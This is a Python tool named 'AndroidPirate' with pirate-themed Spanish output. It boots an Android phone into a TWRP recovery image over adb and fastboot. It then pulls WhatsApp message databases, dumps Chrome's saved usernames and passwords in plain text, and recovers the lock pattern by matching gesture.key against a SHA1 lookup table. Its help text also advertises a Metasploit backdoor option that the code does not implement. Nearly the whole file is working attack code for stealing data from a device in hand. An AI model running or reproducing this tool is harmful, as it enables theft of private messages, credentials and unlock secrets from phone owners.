__author__ = 'tiefighter'

import sys
import os
import time
import sqlite3


banner = '''
   _             _   ___ _           _
  /_\  _ __   __| | / _ (_)_ __ __ _| |_ ___          _.--""--._
 //_\\\\| '_ \ / _` |/ /_)/ | '__/ _` | __/ _ \\        /  _    _  \\
/  _  \ | | | (_| / ___/| | | | (_| | ||  __/     _  ( (_\\  /_) )  _
\_/ \_/_| |_|\__,_\/    |_|_|  \__,_|\__\___|    { \\._\   /\\   /_./ }
                                                 /_"=-.}______{.-="_\\
                                                  _  _.=("""")=._  _
                                                 (_'"_.-"`~~`"-._"'_)
                                                  {_"            "_}
Version: %s
Programador: %s
''' % ('0.5','Nicotrial')

def grab_tresure_from_phone():
    print ("[0] Yoho! Bucaneros Telefono a la vista! Prepararos!! ..")
    if os.path.exists("dump/gesture.key"):
        os.remove("dump/gesture.key")
    if os.path.exists("dump/Login Data"):
        os.remove("dump/Login Data")
    if os.path.exists("dump/msgstore.db"):
        os.remove("dump/msgstore.db")
    if os.path.exists("dump/wa.db"):
        os.remove("dump/wa.db")
    print ("[1] Arr!! Attacar ese movil!!")
    os.system("""adb reboot bootloader""")
    os.system("""fastboot boot TWRP/twrp-2.8.7.1-hammerhead.img""")
    time.sleep(20)
    print ("[2] Yarr!! Abran PASO!!!!")
    
def reboot_phone():
    os.system('''adb reboot''')

def grab_whatssap_from_phone():
    #pillar chats whatsapp
    print("ARGG!! A por el whassap!!")
    os.system('''adb pull /data/data/com.whatsapp/databases/msgstore.db dump''')
    os.system('''adb pull /data/data/com.whatsapp/databases/wa.db dump''')
    print("Guardado en nuestro barco (carpeta dump) abrir con Sqlite Browser")
    #con = sqlite3.connect('dump/msgstore.db')
    #with con:
    #    cur = con.cursor()
    #    cur.execute("SELECT `_rowid_`,* FROM `messages`  ORDER BY `timestamp` DESC LIMIT 0, 50000")
    #    rows = cur.fetchall()
    #    for row in rows:
    #        print str(row)
    #con.close()

def grab_pattern_from_phone():
    #pillar patron de bloqueo
    os.system('''adb pull /data/system/gesture.key dump''')
    f = open("dump/gesture.key", "rb")
    hash = f.read().encode('hex')
    f.close()
    f = open("AndroidGestureSHA1.txt", "r")
    table = f.readlines()
    f.close()
    print ("[4] Encontrado el Mapa Del Tesoro...")
    dict = {}
    hash = hash.strip().upper()
    for entry in table:
        tmp = entry.split(';')
        dict[ tmp[2].strip() ] = tmp[0].strip()
    print ("[5] Por las barbas de Neptuno! Un Mapa!!! AARRRRGGGG!!!")
    print ("    [+] la x marca el sitio ARGGG!!: %s" % hash)
    print ("    [+] Ojo al parche!....")
    try:
        result = dict[hash]
        print ("    [+] EL TESOROOO!!!: %s" % result)
    except:
        print("Arrg... parece ser que no tiene el patron activado o no encontramos cual es su conbinacion ARRGGG!!")
        pass
	
def grab_chrome_from_phone():
    #pillar contrasenas chrome
    os.system('''adb pull "/data/data/com.android.chrome/app_chrome/Default/Login Data" dump''')
    print ("[3] La vitacora Del CaPitan! AARRRGG!!")
    con = sqlite3.connect('dump/Login Data')
    with con:
        cur = con.cursor()
        cur.execute("SELECT origin_url,username_value,cast(password_value as TEXT) FROM logins")
        rows = cur.fetchall()
        for row in rows:
            print str(row).encode('utf-8')
    con.close()


	
def main():
    help = '''
        ./AndroidPirate.py -a -c -p -w <TWRP_backup_para_tu_modelo_de_movil.iso>

        -a:     Abordar el movil
        -m:     Agregar backdoor metasploit ARRGG
        -w:     Buscar chat whatsapp
        -p:     Sacar patron bloqueo
        -c:     Sacar contrasenias Chrome
        Ejemplo:    ./AndoridPirate.py -a -m -p /TWRP/TWRPbackup_nexus.iso
	'''
    if sys.argv[1] == '-a':
        grab_tresure_from_phone()
        for index in range(len(sys.argv)):
            if sys.argv[index] == '-c':
			    grab_chrome_from_phone()
            if sys.argv[index] == '-p':
                grab_pattern_from_phone()
            if sys.argv[index] == '-w':
                grab_whatssap_from_phone()
        reboot_phone()
    else:
        print(help)



if __name__ == '__main__':
    print(banner)
    print('\n Mira, detras de ti, un mono de tres cabezas!')
    main()